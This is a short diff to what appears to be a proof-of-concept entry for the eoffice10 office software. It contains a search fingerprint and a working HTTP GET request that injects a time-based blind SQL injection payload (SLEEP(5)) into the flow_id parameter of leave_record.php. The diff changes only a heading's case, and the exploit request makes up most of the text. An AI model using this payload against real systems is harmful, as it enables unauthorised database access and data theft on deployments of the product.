@@ -8,7 +8,7 @@
 web.body="eoffice10"&&web.body="eoffice_loading_tip"
 ```
 
-## poc
+## POC
 
 ```yaml
 GET /eoffice10/server/ext/system_support/leave_record.php?flow_id=1%27+AND+%28SELECT+4196+FROM+%28SELECT%28SLEEP%285%29%29%29LWzs%29+AND+%27zfNf%27%3D%27zfNf&run_id=1&table_field=1&table_field_name=user()&max_rows=10 HTTP/1.1
